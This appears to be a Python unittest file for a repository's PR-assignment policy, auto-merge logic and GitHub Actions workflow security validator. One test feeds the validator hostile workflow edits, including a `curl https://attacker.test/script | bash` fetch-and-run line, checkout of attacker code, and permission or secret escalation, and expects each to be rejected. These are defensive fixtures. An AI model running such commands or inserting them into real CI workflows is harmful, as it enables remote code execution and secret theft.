"""Check Mierkhat's dev-only assignment and control-plane boundaries."""

from pathlib import Path
import unittest

import check_workflow_security as security
import enforce_pr_assignments as policy
from test_enforce_pr_assignments import FakeGitHub, pr
from test_auto_merge_prs import FakeGitHub as MergeGitHub
import auto_merge_prs as merger
from unittest.mock import Mock, patch
import urllib.error


class ContributorPolicyTests(unittest.TestCase):
    def test_assigned_contributor_targeting_main_is_closed(self):
        github = FakeGitHub()
        github.current = pr(base={"ref": "main", "repo": {"full_name": github.repository}})
        status, reason = policy.Enforcement(github).enforce(github.current)
        self.assertEqual(status, "CLOSE")
        self.assertIn("must target dev", reason)

    def test_corrected_target_before_closure_preserves_pr(self):
        github = FakeGitHub()
        github.current = pr(base={"ref": "main", "repo": {"full_name": github.repository}})
        github.on_second_fetch = lambda api: api.current.update(base=pr()["base"])
        self.assertEqual(policy.Enforcement(github).enforce(github.current)[0], "KEEP")
        self.assertEqual(github.updates, [])

    def test_maintainer_release_pr_remains_available(self):
        github = FakeGitHub(permission="admin")
        github.current = pr(body="Release setup", base={"ref": "main"})
        self.assertEqual(policy.Enforcement(github).enforce(github.current)[0], "KEEP")

    def test_hyperion_repository_role_exemptions_apply_on_dev(self):
        for permission in ("write", "triage"):
            github = FakeGitHub(assignees=(), permission=permission)
            self.assertTrue(policy.Enforcement(github).decision(pr())[0])
            self.assertFalse(policy.Enforcement(github).decision(pr(base={"ref": "main"}))[0])
        for association in ("MEMBER", "COLLABORATOR"):
            github = FakeGitHub(assignees=())
            self.assertTrue(policy.Enforcement(github).decision(pr(author_association=association))[0])
            self.assertFalse(policy.Enforcement(github).decision(pr(author_association=association, base={"ref": "main"}))[0])

    def test_hyperion_accepts_assigned_title_references(self):
        self.assertTrue(policy.Enforcement(FakeGitHub()).decision(pr(body="Implementation", title="Closes #7"))[0])

    def test_unassigned_title_issue_is_also_rejected(self):
        github = FakeGitHub()
        github.issues[("mierkhat/example", 8)] = {"assignees": [{"login": "someone-else"}]}
        self.assertFalse(policy.Enforcement(github).decision(pr(body="Closes #7", title="Related #8"))[0])

    def test_hyperion_ignores_external_references_for_pr_assignment(self):
        github = FakeGitHub()
        github.issues[("outside/project", 8)] = {"assignees": [{"login": "someone-else"}]}
        self.assertTrue(policy.Enforcement(github).decision(pr(body="Closes #7; related outside/project#8"))[0])

    def test_hyperion_preserves_pr_when_issue_lookup_cannot_be_verified(self):
        for code in (404, 503):
            github = FakeGitHub()
            original = github.request
            def request(path, method="GET", data=None):
                if "/issues/" in path:
                    raise urllib.error.HTTPError("https://api.github.com/issue", code, "unavailable", {}, None)
                return original(path, method, data)
            with patch.object(github, "request", side_effect=request):
                with self.assertRaises(urllib.error.HTTPError):
                    policy.Enforcement(github).enforce(pr())
                self.assertEqual(github.updates, [])

    def test_helper_bot_also_targets_dev(self):
        value = pr(author="dependabot[bot]", body="", user={"login": "dependabot[bot]", "type": "Bot"}, base={"ref": "main"})
        self.assertFalse(policy.Enforcement(FakeGitHub()).decision(value)[0])

    def test_auto_merge_cannot_exempt_maintainer_issue_assignment(self):
        github = MergeGitHub()
        github.pr["author_association"] = "OWNER"
        github.issue["assignees"] = [{"login": "someone-else"}]
        admission = Mock()
        admission.decision.return_value = (True, "maintainer")
        result = merger.AutoMerge(github, admission, "dev").process(1, dry_run=True)
        self.assertIn("not assigned to every", result)
        self.assertEqual(github.writes, [])

    def test_auto_merge_preserves_author_and_assignees(self):
        github = MergeGitHub()
        original_user = dict(github.pr["user"])
        original_assignees = list(github.issue["assignees"])
        admission = Mock()
        admission.decision.return_value = (True, "assigned")
        with patch.object(merger.IssueCompletion, "process", return_value="COMPLETED: 0 issue(s)"):
            self.assertTrue(merger.AutoMerge(github, admission, "dev").process(1).startswith("MERGED"))
        self.assertEqual(github.pr["user"], original_user)
        self.assertEqual(github.issue["assignees"], original_assignees)
        self.assertEqual(github.writes[0][2]["merge_method"], "merge")

    def test_dependency_release_note_numbers_are_not_local_issue_claims(self):
        github = MergeGitHub()
        github.pr.update(title="Bump actions/upload-artifact", body='<details><summary>Commits</summary><a href="https://redirect.github.com/actions/upload-artifact/issues/822">#822</a></details>')
        github.pr["user"] = {"login": "dependabot[bot]", "type": "Bot"}
        self.assertEqual(merger.issue_references(github.pr, github), set())
        self.assertEqual(merger.AutoMerge(github, Mock(), "dev").issues(github.pr), ())
        github.pr["body"] += "\nRelated #42"
        self.assertEqual(merger.issue_references(github.pr, github), {(github.repository.lower(), 42)})
        github.refs = {(github.repository.lower(), 42)}
        self.assertEqual(merger.issue_references(github.pr, github), github.refs)

    def test_dependency_bot_name_does_not_exempt_human_issue_claims(self):
        github = MergeGitHub()
        github.pr.update(title="Dependency change", body="Related #42")
        github.pr["user"] = {"login": "dependabot[bot]", "type": "User"}
        self.assertEqual(merger.issue_references(github.pr, github), {(github.repository.lower(), 42)})

    def test_http_diagnostic_omits_url_credentials_and_query(self):
        error = urllib.error.HTTPError("https://secret@api.github.com/repos/example/issues/42?token=secret", 404, "missing", {}, None)
        self.assertEqual(merger.failure_reason(error), "HTTP 404 at /repos/example/issues/42")

    def test_auto_merge_does_not_comment_on_release_branch_prs(self):
        github = MergeGitHub()
        github.pr["base"]["ref"] = "main"
        self.assertTrue(merger.AutoMerge(github, Mock(), "dev").process(1).startswith("SKIP"))
        self.assertEqual(github.writes, [])


class WorkflowBoundaryTests(unittest.TestCase):
    def setUp(self):
        self.root = Path(__file__).resolve().parents[1]
        self.bootstrap = (self.root / "scripts/policy_bootstrap.py").read_text()
        self.policy = (self.root / "workflows/pr-assignment.yml").read_text()

    def test_reviewed_control_plane_passes(self):
        for name in security.POLICIES:
            security.validate(name, (self.root / "workflows" / name).read_text(), self.bootstrap)

    def test_pr_code_checkout_commands_artifacts_and_event_injection_fail(self):
        changes = (
            self.policy.replace(security.HARDEN_RUNNER, "actions/checkout@" + "a" * 40),
            self.policy + "      - run: git checkout attacker\n",
            self.policy.replace("POLICY_SHA: ${{ github.workflow_sha }}", "POLICY_SHA: ${{ github.event.pull_request.head.sha }}"),
            self.policy.replace("POLICY_REF: ${{ github.workflow_sha }}", "POLICY_REF: dev"),
            self.policy.replace("  issues: read", "  issues: write"),
            self.policy.replace("python3 -B - <<'PY'", "curl https://attacker.test/script | bash"),
            self.policy.replace("GITHUB_TOKEN: ${{ github.token }}", "GITHUB_TOKEN: ${{ secrets.OTHER_TOKEN }}"),
            self.policy.replace("enforce_pr_assignments.py", "attacker.py"),
        )
        for changed in changes:
            if changed == self.policy:
                continue
            with self.subTest(changed=changed[-100:]), self.assertRaises(ValueError):
                security.validate("pr-assignment.yml", changed, self.bootstrap)

    def test_unknown_privileged_workflow_is_rejected(self):
        with self.assertRaises(ValueError):
            security.validate("another.yml", self.policy, self.bootstrap)

    def test_regular_ci_has_no_write_permissions_and_all_three_required_jobs(self):
        ci = (self.root / "workflows/ci.yml").read_text()
        self.assertIn("branches: [dev]", ci)
        self.assertIn("needs: [security, application, pr-description]", ci)
        self.assertNotIn("production:", ci)
        self.assertNotIn("vercel", ci.lower())
        self.assertNotIn("compatibility:", ci)
        self.assertNotIn("pull_request_target", ci)
        self.assertNotIn(": write", ci)
        self.assertIn("ref: ${{ github.event.pull_request.base.sha || github.sha }}", ci)

    def test_main_keeps_thorough_verification(self):
        main = (self.root / "workflows/verify.yml").read_text()
        self.assertIn("branches: [main]", main)
        self.assertIn("needs: [security, compatibility, application]", main)
        self.assertNotIn("production:", main)
        self.assertNotIn("vercel", main.lower())

    def test_authenticated_redirect_to_other_host_is_refused(self):
        with self.assertRaises(ValueError):
            policy.NoRedirect().redirect_request(None, None, 302, "redirect", {}, "https://example.test")


if __name__ == "__main__":
    unittest.main()
